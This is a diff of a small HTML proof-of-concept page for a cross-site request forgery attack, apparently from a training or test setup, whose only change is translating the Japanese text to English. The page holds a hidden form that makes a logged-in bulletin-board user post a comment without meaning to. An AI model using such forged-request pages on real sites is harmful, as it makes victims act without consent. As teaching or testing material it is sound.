@@ -8,9 +8,9 @@
 </head>
 <body>
   <h3>CSRF PoC</h3>
-  <h6>BBSにログインしてから実行する必要があります。</h6>
+  <h6>You must log in to the BBS before running this.</h6>
     <form action="index.php" method="POST">
-      <input type="hidden" name="comment" value="謀反だ！！ （これはCSRFのテストです）" />
+      <input type="hidden" name="comment" value="Rebellion!! (This is a CSRF test)" />
       <input type="hidden" name="submit" value="submit" />
       <input type="submit" value="Submit PoC Request" />
     </form>
